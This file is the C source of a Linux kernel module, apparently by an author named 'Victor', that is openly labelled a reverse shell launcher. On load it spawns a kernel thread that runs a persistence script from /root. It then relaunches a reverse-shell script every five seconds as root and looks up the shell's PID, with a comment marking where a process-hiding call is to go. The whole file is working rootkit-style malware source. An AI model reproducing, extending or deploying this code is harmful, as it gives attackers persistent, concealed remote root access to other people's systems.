#include <linux/module.h>
#include <linux/init.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/kmod.h>
#include <linux/sched.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/seq_file.h>

static struct task_struct *revshell_thread;
static pid_t revshell_pid = -1;

// Fonction pour trouver le PID d'un processus par son nom
static pid_t find_pid_by_name(const char *name) {
    struct task_struct *task;

    for_each_process(task) {
        if (strcmp(task->comm, name) == 0) {
            return task->pid;
        }
    }
    return -1;
}

static int revshell_function(void *data) {
    char *persistence_argv[] = {"/bin/bash", "/root/persistence.sh", NULL};
    char *revshell_argv[] = {"/bin/bash", "/root/revshell.sh", NULL};
    char *envp[] = {"HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};

    // Lancer le script de persistance
    int ret = call_usermodehelper(persistence_argv[0], persistence_argv, envp, UMH_WAIT_EXEC);
    if (ret != 0) {
        printk(KERN_ERR "Error launching persistence.sh: %d\n", ret);
    } else {
        printk(KERN_INFO "Persistence script launched successfully.\n");
    }

    while (!kthread_should_stop()) {
        ret = call_usermodehelper(revshell_argv[0], revshell_argv, envp, UMH_WAIT_EXEC);
        if (ret != 0) {
            printk(KERN_ERR "Error launching revshell.sh: %d\n", ret);
        } else {
            printk(KERN_INFO "Reverse shell launched successfully.\n");
        }

        // Rechercher le PID du script
        revshell_pid = find_pid_by_name("bash");
        if (revshell_pid > 0) {
            //call the hide_process function here
            printk(KERN_INFO "Reverse shell PID: %d\n", revshell_pid);
        } else {
            printk(KERN_WARNING "Reverse shell PID not found.\n");
        }

        ssleep(5);
    }

    return 0;
}

static int __init lkm_init(void) {
    printk(KERN_INFO "Starting Reverse Shell LKM...\n");

    revshell_thread = kthread_run(revshell_function, NULL, "revshell_thread");
    if (IS_ERR(revshell_thread)) {
        printk(KERN_ERR "Failed to create thread.\n");
        return PTR_ERR(revshell_thread);
    }

    printk(KERN_INFO "Reverse shell thread started.\n");
    return 0;
}

static void __exit lkm_exit(void) {
    if (revshell_thread) {
        kthread_stop(revshell_thread);
        printk(KERN_INFO "Reverse shell thread stopped.\n");
    }

    printk(KERN_INFO "Reverse Shell LKM unloaded.\n");
}

module_init(lkm_init);
module_exit(lkm_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Victor");
MODULE_DESCRIPTION("Reverse Shell Launcher with PID Retrieval");
